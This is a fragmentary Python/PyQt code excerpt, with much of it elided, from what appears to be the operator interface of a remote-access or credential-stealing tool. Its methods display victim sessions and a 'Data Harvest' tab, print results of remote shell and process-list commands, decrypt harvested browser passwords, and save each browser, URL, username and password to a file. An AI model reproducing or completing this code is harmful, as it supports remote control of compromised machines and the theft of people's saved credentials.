...
class SessionView(QWidget):
    ...
    def load_session(self, session_id, session_data):
        ...
        self.tabs.setCurrentIndex(0) # Default to the Data Harvest tab
    ...
    def handle_command_response(self, session_id, module_name, data_packet):
        ...
        output = data_packet.get('output', {}); data = output.get('data', '[No data received]'); status = output.get('status')
        ...
        if status == 'error':
            ...
            if action_name == "shell": self.terminal_pane.append_output(f"{error_message}\n")
            return
        
        if original_task:
            action = original_task.get('action', 'unknown')
            if action == "shell": self.terminal_pane.append_output(f"{data}\n")
            elif action == "running_processes": self.liveactions_pane.display_result(f"--- Process List @ {datetime.now():%Y-%m-%d %H:%M:%S} ---\n{data}\n")
    ...
    def handle_decryption(self):
        ...
        if isinstance(results, dict) and "error" in results:
            QMessageBox.critical(self, "Decryption Failed", results["error"]); return
        if not results:
            QMessageBox.information(self, "No Passwords", "No decryptable passwords were found in the provided data."); return
            ...
            try:
                with open(save_path, 'w', encoding='utf-8') as f:
                    if save_path.endswith(".json"): json.dump(results, f, indent=4)
                        ...
                        for item in results: f.write(f"Browser: {item['Browser']}\nURL: {item['URL']}\nUsername: {item['Username']}\nPassword: {item['Password']}\n\n")
